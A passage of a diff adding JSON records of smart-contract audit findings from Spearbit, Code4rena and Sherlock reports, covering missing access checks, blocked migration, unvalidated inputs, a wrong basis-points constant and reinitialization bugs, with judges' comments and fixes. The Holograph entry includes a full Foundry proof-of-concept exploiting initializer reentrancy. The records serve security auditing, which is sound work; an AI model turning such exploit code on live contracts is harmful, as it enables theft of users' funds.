ds.supportedInterfaces[type(IProposedOwnable).interfaceId] = true;\n- ds.acceptanceDelay = _acceptanceDelay;\n\nif (!s.initialized) {\n    ...\n    // Proposed implementation\n    + ds.supportedInterfaces[type(IERC165).interfaceId] = true;\n    + ds.supportedInterfaces[type(IDiamondCut).interfaceId] = true;\n    + ds.supportedInterfaces[type(IDiamondLoupe).interfaceId] = true;\n    + ds.supportedInterfaces[type(IProposedOwnable).interfaceId] = true;\n    + ds.acceptanceDelay = _acceptanceDelay;\n    ...\n}\n```\n\n## Connect\n**Fixed in PR 2393.**\n\n## Spearbit\n**Verified.**",
+      "summary": "\nThis bug report is regarding an issue with the DiamondInit.sol code. It states that any user can set the acceptanceDelay and supportedInterfaces[] without the need of any Authorization once the init function of DiamondInit has been called and set. This is happening because caller checks (LibDiamond.enforceIsContractOwner(); ) are missing for these fields. This poses a high risk as setting a very large value could DOS the system and setting a very low value could make changes without consideration time. \n\nThe recommendation is to change the function implementation by adding the following code: LibDiamond.DiamondStorage storage ds = LibDiamond.diamondStorage();, ds.supportedInterfaces[type(IERC165).interfaceId] = true;, ds.supportedInterfaces[type(IDiamondCut).interfaceId] = true;, ds.supportedInterfaces[type(IDiamondLoupe).interfaceId] = true;, ds.supportedInterfaces[type(IProposedOwnable).interfaceId] = true;, ds.acceptanceDelay = _acceptanceDelay;, and then adding the same code after the if (!s.initialized) statement.\n\nThe bug has been fixed in PR 2393 and verified by Spearbit.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 4,
+      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
+      "github_link": "",
+      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/ConnextNxtp-Spearbit-Security-Review.pdf",
+      "pdf_page_from": 17,
+      "contest_id": "",
+      "slug": "unauthorized-access-to-change-acceptancedelay-spearbit-connext-pdf",
+      "firm_name": "Spearbit",
+      "firm_logo_square": "spearbit_square.png",
+      "protocol_name": "Connext",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Connext",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Bridge"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "6038",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "97",
+      "title": "[M-01] `PirexGmx.initiateMigration` can be blocked",
+      "content": "\n`PirexGmx.initiateMigration` can be blocked so contract will not be able to migrate his funds to another contract using gmx.\n\n### Proof of Concept\n\nPirexGmx was designed with the thought that the current contract can be changed with another during migration.\n\n`PirexGmx.initiateMigration` is the first point in this long process.\n\n<https://github.com/code-423n4/2022-11-redactedcartel/blob/main/src/PirexGmx.sol#L921-L935>\n\n```solidity\n    function initiateMigration(address newContract)\n        external\n        whenPaused\n        onlyOwner\n    {\n        if (newContract == address(0)) revert ZeroAddress();\n\n\n        // Notify the reward router that the current/old contract is going to perform\n        // full account transfer to the specified new contract\n        gmxRewardRouterV2.signalTransfer(newContract);\n\n\n        migratedTo = newContract;\n\n\n        emit InitiateMigration(newContract);\n    }\n```\n\nAs you can see `gmxRewardRouterV2.signalTransfer(newContract);` is called to start migration.\n\nThis is the code of signalTransfer function\n<https://arbiscan.io/address/0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1#code#F1#L282>\n\n```solidity\n    function signalTransfer(address _receiver) external nonReentrant {\n        require(IERC20(gmxVester).balanceOf(msg.sender) == 0, \"RewardRouter: sender has vested tokens\");\n        require(IERC20(glpVester).balanceOf(msg.sender) == 0, \"RewardRouter: sender has vested tokens\");\n\n        _validateReceiver(_receiver);\n        pendingReceivers[msg.sender] = _receiver;\n    }\n```\n\nAs you can see the main condition to start migration is that PirexGmx doesn't control any gmxVester and glpVester tokens.\n\nSo attacker can [deposit](https://arbiscan.io/address/0xa75287d2f8b217273e7fcd7e86ef07d33972042e#code#F1#L117) and receive such tokens and then just transfer tokens directly to PirexGmx.\n\nAs a result migration will never be possible as there is no possibility for PirexGmx to burn those gmxVester and glpVester tokens.\n\nAlso in the same way, the migration receiver can also be blocked.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nThink about how to make contract ensure that he doesn't control any gmxVester and glpVester tokens before migration.\n\n**[Picodes (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/61)**\n\n**Please note: the following comment occurred after judging and awarding were finalized.**\n\n**[kphed (Redacted Cartel) commented](https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/61#issuecomment-1382029037):**\n> This issue is invalid and not possible to carry out as a non-GMX insider (if the GMX team and multisig were malicious, there would be many other ways in which they can steal value, so this specific vector would be the least of our concerns) for the following reasons:\n>\n> 1. The vester token transfer methods are overridden which removes the possibility of an attacker acquiring vGMX or vGLP and transferring it to the PirexGmx contract via those methods.\n\n> Vester.sol | Lines 246-263\n> - [vGMX](https://arbiscan.io/address/0x199070ddfd1cfb69173aa2f7e20906f26b363004#code#F1#L246)\n> - [vGLP](https://arbiscan.io/address/0xa75287d2f8b217273e7fcd7e86ef07d33972042e#code#F1#L246)\n> ```\n> // empty implementation, tokens are non-transferrable\n> function transfer(address /* recipient */, uint256 /* amount */) public override returns (bool) {\n>      revert(\"Vester: non-transferrable\");\n> }\n> \n> ...\n> \n> // empty implementation, tokens are non-transferrable\n> function transferFrom(address /* sender */, address /* recipient */, uint256 /* amount */) public virtual override returns (bool) {\n>      revert(\"Vester: non-transferrable\");\n> }\n> ```\n> \n> 2. The `depositForAccount` method can only be called by an account set by the GMX team as a \"handler\" so an attacker can't volunteer esGMX be vested on behalf of another account. Even if `depositForAccount` were to be callable by anyone, esGMX has to first be unstaked before it can be deposited for vesting, which is never the case for our contracts.\n\n\n\n***\n\n",
+      "summary": "\nThis bug report describes a vulnerability in the PirexGmx smart contract, which is part of a larger project. The code for the contract can be found at the given link. The vulnerability allows an attacker to prevent the contract from migrating its funds to another contract by depositing and receiving gmxVester and glpVester tokens. The attacker then transfers the tokens directly to the PirexGmx contract, which prevents the contract from burning the tokens and migrating its funds. The same technique can also be used to block the migration receiver. The bug was discovered using the VsCode tool. The recommended mitigation step is to think of a way to ensure that the contract does not control any gmxVester or glpVester tokens before migration.",
+      "report_date": {},
+      "contest_prize_txt": "$90,500 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-11-redacted-cartel-contest",
+      "sponsor_name": "Redacted Cartel",
+      "sponsor_link": "https://twitter.com/redactedcartel",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "https://code4rena.com/reports/2022-11-redactedcartel",
+      "github_link": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/61",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "183",
+      "slug": "m-01-pirexgmxinitiatemigration-can-be-blocked-code4rena-redacted-cartel-redacted-cartel-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Redacted Cartel",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Redacted Cartel",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Revert By Sending Dust"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "3537",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "102",
+      "title": "M-13: BondBaseSDA.setDefaults doesn't validate inputs",
+      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/11 \n\n## Found by \nrvierdiiev\n\n## Summary\nBondBaseSDA.setDefaults doesn't validate inputs which can lead to initializing new markets incorrectly\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L348-L356\n```solidity\n    function setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n        // Restricted to authorized addresses\n        defaultTuneInterval = defaults_[0];\n        defaultTuneAdjustment = defaults_[1];\n        minDebtDecayInterval = defaults_[2];\n        minDepositInterval = defaults_[3];\n        minMarketDuration = defaults_[4];\n        minDebtBuffer = defaults_[5];\n    }\n```\n\nFunction BondBaseSDA.setDefaults doesn't do any checkings, as you can see. Because of that it's possible to provide values that will break market functionality.\n\nFor example you can set `minDepositInterval` to be bigger than `minMarketDuration` and it will be [not possible](https://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L174-L178) to create new market.\n\nOr you can provide `minDebtBuffer` to be 100% ot 0% that will break logic of market closing.\n## Impact\nCan't create new market or market logic will be not working as designed.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nAdd input validation.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We added the following validation checks to `setDefaults`:\n- defaultTuneInterval >= defaultTuneAdjustment\n- defaultTuneInterval >= minDepositInterval\n- minMarketDuration >= minDepositInterval\n- minDebyDecayInterval >= 5 * minDepositInterval\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/141c286cccb7797f8cca68edaf9b886f12897405",
+      "summary": "\nA bug has been found in BondBaseSDA.setDefaults, which is a function in the Bond Protocol. The function does not validate inputs, leading to the possibility of initializing new markets incorrectly. This would mean that it wouldn't be possible to create new markets, or the market logic would not work as designed. To fix this issue, input validation has been added to the function. This includes checks such as making sure defaultTuneInterval is greater than or equal to defaultTuneAdjustment, defaultTuneInterval is greater than or equal to minDepositInterval, minMarketDuration is greater than or equal to minDepositInterval, and minDebyDecayInterval is greater than or equal to 5 * minDepositInterval. The bug has been fixed with the commit at https://github.com/Bond-Protocol/bonds/commit/141c286cccb7797f8cca68edaf9b886f12897405.",
+      "report_date": {},
+      "contest_prize_txt": "33333 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/20",
+      "sponsor_name": "Bond",
+      "sponsor_link": "",
+      "quality_score": 4,
+      "general_score": 5,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/11",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "20",
+      "slug": "m-13-bondbasesdasetdefaults-doesnt-validate-inputs-sherlock-bond-bond-protocol-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Bond Protocol",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Bond Protocol",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Liquid Staking"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Synthetics"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "RWA Lending"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Validation"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "3516",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "104",
+      "title": "M-4: WithdrawPeriphery uses incorrect value for MAX_BPS which will allow much higher slippage than intended",
+      "content": "Source: https://github.com/sherlock-audit/2022-10-rage-trade-judging/issues/39 \n\n## Found by \n0x52\n\n## Summary\n\nWithdrawPeriphery accidentally uses an incorrect value for MAX_BPS which will allow for much higher slippage than intended. \n\n## Vulnerability Detail\n\n    uint256 internal constant MAX_BPS = 1000;\n\nBPS is typically 10,000 and using 1000 is inconsistent with the rest of the ecosystem contracts and tests. The result is that slippage values will be 10x higher than intended.\n\n## Impact\n\nUnexpected slippage resulting in loss of user funds, likely due to MEV\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-rage-trade/blob/main/dn-gmx-vaults/contracts/periphery/WithdrawPeriphery.sol#L47\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCorrect MAX_BPS:\n\n    -   uint256 internal constant MAX_BPS = 1000;\n    +   uint256 internal constant MAX_BPS = 10_000;",
+      "summary": "\nThis bug report is about an issue found in WithdrawPeriphery, a contract used in the Rage Trade ecosystem. The issue is that the MAX_BPS value is set to 1000 instead of the expected 10,000. This will cause much higher slippage than intended, resulting in a potential loss of user funds. The bug was found through manual review and the recommendation is to correct the MAX_BPS value to 10,000.",
+      "report_date": {},
+      "contest_prize_txt": "50000 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/16",
+      "sponsor_name": "Rage Trade",
+      "sponsor_link": "",
+      "quality_score": 4,
+      "general_score": 3,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2022-10-rage-trade-judging/issues/39",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "16",
+      "slug": "m-4-withdrawperiphery-uses-incorrect-value-for-max_bps-which-will-allow-much-higher-slippage-than-intended-sherlock-rage-trade-rage-trade-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Rage Trade",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Rage Trade",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "5808",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "189",
+      "title": "[M-01] Multiples initializations of `JBTiered721Delegate`",
+      "content": "\nThe `initialize` method of the `JBTiered721Delegate` contract has as a flag that the `_store` argument is different from `address(0)`, however, it can be initialized by anyone with this value to allow the project to continue with its usual initialization, the attacker could have interfered and modified the corresponding values to carry out an attack.\n\n### Proof of Concept\n\nLooking at the method below, we highlight in green the parts that need to be initialized to prevent a call to `store=address(0)` from failing.\n\n```diff\n  function initialize(\n    uint256 _projectId,\n    IJBDirectory _directory,\n    string memory _name,\n    string memory _symbol,\n    IJBFundingCycleStore _fundingCycleStore,\n    string memory _baseUri,\n    IJBTokenUriResolver _tokenUriResolver,\n    string memory _contractUri,\n    JB721PricingParams memory _pricing,\n    IJBTiered721DelegateStore _store,\n    JBTiered721Flags memory _flags\n  ) public override {\n    // Make the original un-initializable.\n    require(address(this) != codeOrigin);\n    // Stop re-initialization.\n    require(address(store) == address(0));\n\n    // Initialize the sub class.\n    JB721Delegate._initialize(_projectId, _directory, _name, _symbol);\n\n    fundingCycleStore = _fundingCycleStore;\n    store = _store;\n    pricingCurrency = _pricing.currency;\n    pricingDecimals = _pricing.decimals;\n    prices = _pricing.prices;\n\n    // Store the base URI if provided.\n+   if (bytes(_baseUri).length != 0) _store.recordSetBaseUri(_baseUri);\n\n    // Set the contract URI if provided.\n+   if (bytes(_contractUri).length != 0) _store.recordSetContractUri(_contractUri);\n\n    // Set the token URI resolver if provided.\n+   if (_tokenUriResolver != IJBTokenUriResolver(address(0)))\n      _store.recordSetTokenUriResolver(_tokenUriResolver);\n\n    // Record adding the provided tiers.\n+   if (_pricing.tiers.length > 0) _store.recordAddTiers(_pricing.tiers);\n\n    // Set the flags if needed.\n    if (\n+     _flags.lockReservedTokenChanges ||\n+     _flags.lockVotingUnitChanges ||\n+     _flags.lockManualMintingChanges ||\n+     _flags.pausable\n    ) _store.recordFlags(_flags);\n\n    // Transfer ownership to the initializer.\n    _transferOwnership(msg.sender);\n  }\n```\n\nSo if the attacker initializes the contract as follows:\n\n*   `_baseUri` = \"\"\n*   `_contractUri` = \"\"\n*   `_tokenUriResolver` = `address(0)`\n*   `_pricing.tiers` = \\[]\n*   `_flags` = all `false`\n\nThe contract will be initialized and transfered the ownership to `msg.sender`.\n\nAfter that, the owner can call `didPay` with the the fake data provided in [JBTiered721Delegate.sol:221](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721Delegate.sol#L221) and increase `creditsOf` of anyone [JBTiered721Delegate.sol:587](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721Delegate.sol#L587) without touching any `store` call.\n\n*   The attacker can transfer the ownership to the contract, and the project will be able to initialize the contract again without notice.\n\n### Recommended Mitigation Steps\n\nEnsure that the `store` address is not empty.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2022-10-juicebox-findings/issues/24#issuecomment-1304542277):**\n > I believe the finding to be valid if:\n> \n> - the attacker initialize the contract with `_store == address(0)` and the parameters as above so it does not revert in the normal process\n> - the attacker calls initialize to transfer the ownership to himself and modify the storage so he can then call `didPay`\n> - the attacker calls `didPay` to manipulate `creditsOf`\n> - finally the attacker calls `initialize` to set `_store` to non zero and at this point it is like if nothing happened although `creditsOf` has been manipulated\n\n**[drgorillamd (Juicebox DAO) commented](https://github.com/code-423n4/2022-10-juicebox-findings/issues/24#issuecomment-1304544699):**\n > Hmm, this would require a spoof directory too (to bypass the isTerminalOf check) -> I'd mitigate with a `check msg.value==data.value` in the abstract delegate contract, ie if someone wants to do this, actually paying the credit is needed\n\n> Def nice finding, ggwp!\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2022-10-juicebox-findings/issues/24#issuecomment-1304552713):**\n > I do agree that Med is more appropriate as it falls within centralization risks as ultimately only the deployer could exploit this.\n\n\n***\n\n",
+      "summary": "\nThis bug report is about the `initialize` method of the `JBTiered721Delegate` contract, which allows anyone to initialize the contract with the `_store` argument set to `address(0)`. This could enable an attacker to interfere and modify the corresponding values to carry out an attack. \n\nThe attacker could call the `didPay` method with fake data, which would allow them to increase the `creditsOf` of anyone without touching any `store` call. The attacker could also transfer the ownership to the contract, allowing the project to initialize the contract again without notice.\n\nTo mitigate this issue, it is recommended to ensure that the `store` address is not empty.",
+      "report_date": {},
+      "contest_prize_txt": "$50,000 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-10-juicebox-contest",
+      "sponsor_name": "Juicebox",
+      "sponsor_link": "https://twitter.com/juiceboxETH",
+      "quality_score": 4,
+      "general_score": 3,
+      "source_link": "https://code4rena.com/reports/2022-10-juicebox",
+      "github_link": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/24",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "172",
+      "slug": "m-01-multiples-initializations-of-jbtiered721delegate-code4rena-juicebox-juicebox-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Juicebox",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Juicebox",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Liquid Staking"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Bridge"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "5603",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "131",
+      "title": "[M-10] Holographable tokens can be reinitialized",
+      "content": "\nWhen new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.\n\nHowever, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.\n\nOne way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.\n\n### Proof of Concept:\n\n    // SPDX-License-Identifier: UNLICENSED\n    pragma solidity ^0.8.13;\n\n    import \"forge-std/Test.sol\";\n    import \"../contracts/HolographFactory.sol\";\n    import \"../contracts/HolographRegistry.sol\";\n    import \"../contracts/Holograph.sol\";\n    import \"../contracts/enforcer/HolographERC20.sol\";\n\n    //Contract used to show reentrancy in initializer\n    contract SourceContract {\n        address public holographer;\n        MockContract public mc;\n\n        constructor() {\n             mc = new MockContract();\n        }\n\n        //function that reenters the holographer and sets this contract as the new holograph slot\n        function init(bytes memory initPayload) external returns(bytes4) {\n            assembly {\n                sstore(holographer.slot, caller())\n            }\n            bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32(\"0xabc\"), address(this)), bytes(\"0x0\")); \n            holographer.call(abi.encodeWithSignature(\"init(bytes)\", initCode));\n            return InitializableInterface.init.selector;\n        }\n\n        function getRegistry() external view returns (address) {\n            return address(this);\n        }\n\n        function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {\n            return address(mc);\n        }\n\n        function isTheHolograph() external pure returns (bool) {\n            return true;\n        }\n\n    }\n\n    //simple extension contract to return easily during reinitialization\n    contract MockContract {\n        constructor() {}\n\n        function init(bytes memory initPayload) external pure returns(bytes4) {\n            return InitializableInterface.init.selector;\n        }\n    }\n\n    contract HolographTest is Test {\n        DeploymentConfig public config;\n        Verification public verifiedSignature;\n        HolographFactory public hf;\n        HolographRegistry public hr;\n        Holograph public h;\n        HolographERC20 public he20;\n\n        uint256 internal userPrivateKey;\n        address internal hrAdmin;\n        mapping(uint256 => bool) public _burnedTokens;\n        address internal user;\n        function setUp() public {\n            //Creating all of the required objects\n            hf = new HolographFactory();\n            hr = new HolographRegistry();\n            h = new Holograph();\n            he20 = new HolographERC20();\n\n            //Setting up the registry admin\n            hrAdmin = vm.addr(100);\n\n            //Creating factory, holograph, and registry init payloads\n            bytes memory hfInitPayload = abi.encode(address(h), address(hr));\n            hf.init(hfInitPayload);\n            bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));\n            h.init(hInitPayload);\n            bytes32[] memory reservedTypes = new bytes32[](1);\n            reservedTypes[0] = \"0xabc\";\n            bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);\n\n            //Setting up a contract type address for the ERC20 enforcer\n            vm.startPrank(hrAdmin, hrAdmin);\n            hr.init(hrInitPayload);\n            hr.setContractTypeAddress(reservedTypes[0], address(he20));\n            vm.stopPrank();\n\n            //Keys used to sign transaction for deployment\n            userPrivateKey = 0x1337;\n            user = vm.addr(userPrivateKey);\n        }\n\n        function testDeployShadyHolographer() public {\n            //setting up the configuration, contract type is not important\n            config.contractType = \"0xabc\";\n            config.chainType = 1;\n            config.salt = \"0x12345\";\n            config.byteCode = type(SourceContract).creationCode;\n            bytes memory initCode = \"0x123\";\n\n            //giving our token some semi-realistic metadata\n            config.initCode = abi.encode(\"HToken\", \"HT\", uint8(18), uint256(0), \"HTdomainSeparator\", \"HTdomainVersion\", false, initCode);\n\n            //creating the hash for our user to sign\n            bytes32 hash = keccak256(\n                abi.encodePacked(\n                    config.contractType,\n                    config.chainType,\n                    config.salt,\n                    keccak256(config.byteCode),\n                    keccak256(config.initCode),\n                    user\n                ));\n\n            //signing the hash and creating the verified signature\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);\n            verifiedSignature.r = r;\n            verifiedSignature.v = v;\n            verifiedSignature.s = s;\n\n            //deploying our new source contract and holographable contract pair\n            hf.deployHolographableContract(config, verifiedSignature, user);\n\n            //after the reentrancy has affected the initialization, we grab the holographer address from the registry\n            address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));\n\n            //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract\n            assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);\n        }\n    }\n\n### Recommended Mitigation Steps\n\nConsider checking whether the contract is in an \"initializing\" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1295226137):**\n > I think the enforcer should be considered trusted so the risk here is low.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1306712519):**\n > Good observation. `_setInitialized();` needs to be moved higher up the stack before the init call.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
+      "summary": "\nThis bug report is about a vulnerability in the HolographFactory contract, which is used to create new holographable tokens. During the process of creating the tokens, the holograph contract is passed in as a parameter to the initializer function. However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This allows two special addresses to transfer assets on behalf of other users without an allowance, which can lead to unauthorized transfers.\n\nTo mitigate this vulnerability, the contract should check whether it is in an \"initializing\" phase such as is done in OpenZeppelin's Initializable library. Additionally, if the bridge and operators are not intended to transfer tokens directly, the logic that allows them to bypass the allowance requirements should be removed.",
+      "report_date": {},
+      "contest_prize_txt": "$75,000 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-10-holograph-contest",
+      "sponsor_name": "Holograph",
+      "sponsor_link": "https://twitter.com/holographxyz",
+      "quality_score": 4,
+      "general_score": 3,
+      "source_link": "https://code4rena.com/reports/2022-10-holograph",
